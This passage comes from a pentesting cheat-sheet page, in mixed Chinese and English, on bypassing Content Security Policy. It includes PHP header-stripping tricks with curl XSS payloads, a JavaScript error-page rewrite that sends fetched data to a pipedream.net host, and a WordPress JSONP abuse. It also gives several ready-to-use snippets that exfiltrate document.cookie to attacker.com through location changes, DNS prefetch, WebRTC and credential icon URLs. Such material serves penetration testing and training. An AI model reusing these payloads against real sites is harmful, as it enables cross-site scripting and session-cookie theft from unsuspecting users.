另一种技术是利用 CSP 本身来推断秘密子域。该方法依赖于二分查找算法，并通过调整 CSP 以包含特定的、被故意阻止的域名来实现。例如，如果秘密子域由未知字符组成，你可以通过迭代地测试不同的子域名，修改 CSP 指令以阻止或允许这些子域。下面是一个代码片段，展示了如何设置 CSP 以便实施该方法：
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
通过监控哪些请求被 CSP 阻止或允许，可以逐步缩小秘密子域名中可能的字符，最终发现完整的 URL。

这两种方法都利用了浏览器中 CSP 实现和行为的细微差别，展示了看似安全的策略如何无意中 leak 敏感信息。

技巧来自 [**here**](https://ctftime.org/writeup/29310).

## Unsafe Technologies to Bypass CSP

### PHP Errors when too many params

According to the [**last technique commented in this video**](https://www.youtube.com/watch?v=Sm4G6cAHjWM), sending too many parameters (1001 GET parameters although you can also do it with POST params and more that 20 files). Any defined **`header()`** in the PHP web code **won't be sent** because of the error that this will trigger.

### PHP response buffer overload

PHP is known for **buffering the response to 4096** bytes by default. Therefore, if PHP is showing a warning, by providing **enough data inside warnings**, the **response** will be **sent** **before** the **CSP header**, causing the header to be ignored.\
Then, the technique consists basically in **filling the response buffer with warnings** so the CSP header isn't sent.

Idea from [**this writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Kill CSP via max_input_vars (headers already sent)

Because headers must be sent before any output, warnings emitted by PHP can invalidate later `header()` calls. If user input exceeds `max_input_vars`, PHP throws a startup warning first; any subsequent `header('Content-Security-Policy: ...')` will fail with “headers already sent”, effectively disabling CSP and allowing otherwise-blocked reflective XSS.
```php
<?php
header("Content-Security-Policy: default-src 'none';");
echo $_GET['xss'];
```
示例：
```bash
# CSP in place → payload blocked by browser
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>"

# Exceed max_input_vars to force warnings before header() → CSP stripped
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>&A=1&A=2&...&A=1000"
# Warning: PHP Request Startup: Input variables exceeded 1000 ...
# Warning: Cannot modify header information - headers already sent
```
### Rewrite Error Page

从 [**this writeup**](https://blog.ssrf.kr/69) 看起来可以通过加载错误页面（可能没有 CSP）并重写其内容来 bypass CSP 保护。
```javascript
a = window.open("/" + "x".repeat(4100))
setTimeout(function () {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`
}, 1000)
```
### SOME + 'self' + wordpress

SOME 是一种利用 XSS（或受限 XSS）的技术，**在页面的某个端点****滥用** **相同源的其他端点。** 它的做法是从攻击者页面加载易受攻击的端点，然后将攻击者页面刷新到你想滥用的相同源的真实端点。这样，**易受攻击的端点**可以在**`opener`**对象在**payload**中使用来**访问 DOM**以滥用**真实端点**。更多信息请参见：

{{#ref}}
../xss-cross-site-scripting/some-same-origin-method-execution.md
{{#endref}}

Moreover, **wordpress** has a **JSONP** endpoint in `/wp-json/wp/v2/users/1?_jsonp=data` that will **reflect** the **data** sent in the output (with the limitation of only letter, numbers and dots).

An attacker can abuse that endpoint to **generate a SOME attack** against WordPress and **embed** it inside `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` note that this **script** will be **loaded** because it's **allowed by 'self'**. Moreover, and because WordPress is installed, an attacker might abuse the **SOME attack** through the **vulnerable** **callback** endpoint that **bypasses the CSP** to give more privileges to a user, install a new plugin...\
For more information about how to perform this attack check [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Exfiltration 绕过

如果存在严格的 CSP 不允许你**与外部服务器交互**，仍有一些方法可以将信息外泄。

### Location

You could just update the location to send to the attacker's server the secret information:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
document.location = "https://attacker.com/?" + sessionid
```
### Meta 标签

你可以通过注入 meta 标签进行重定向（这只是一个重定向，不会 leak 内容）
```html
<meta http-equiv="refresh" content="1; http://attacker.com" />
```
### DNS Prefetch

为了加快页面加载，浏览器会预先将主机名解析为 IP 地址并缓存以备后用。\
你可以用以下方式指示浏览器预解析主机名： `<link rel="dns-prefetch" href="something.com">`

你可以滥用此行为来 **exfiltrate sensitive information via DNS requests**：
```javascript
var sessionid = document.cookie.split("=")[1] + "."
var body = document.getElementsByTagName("body")[0]
body.innerHTML =
body.innerHTML +
'<link rel="dns-prefetch" href="//' +
sessionid +
'attacker.ch">'
```
另一种方法：
```javascript
const linkEl = document.createElement("link")
linkEl.rel = "prefetch"
linkEl.href = urlWithYourPreciousData
document.head.appendChild(linkEl)
```
为了避免这种情况发生，服务器可以发送 HTTP header：
```
X-DNS-Prefetch-Control: off
```
> [!TIP]
> 显然，此技术在 headless browsers (bots) 中不起作用

### WebRTC

在多篇文章中可以看到 **WebRTC 不会检查 CSP 的 `connect-src` 策略**。

实际上，你可以使用 _DNS request_ 来 _leak_ 信息。查看以下代码：
```javascript
;(async () => {
p = new RTCPeerConnection({ iceServers: [{ urls: "stun:LEAK.dnsbin" }] })
p.createDataChannel("")
p.setLocalDescription(await p.createOffer())
})()
```
另一个选项：
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
### CredentialsContainer

凭证弹出窗口会向 iconURL 发送 DNS 请求，而不会受到页面的限制。它仅在安全上下文（HTTPS）或 localhost 上工作。
```javascript
navigator.credentials.store(
new FederatedCredential({
id:"satoki",
name:"satoki",
provider:"https:"+your_data+"example.com",
iconURL:"https:"+your_data+"example.com"
})
)
```
## 在线检查 CSP 策略

- [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
- [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## 自动创建 CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## 参考资料

- [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
- [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
- [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
- [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
- [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
- [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
- [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)
- [https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket](https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

​

{{#include ../../banners/hacktricks-training.md}}
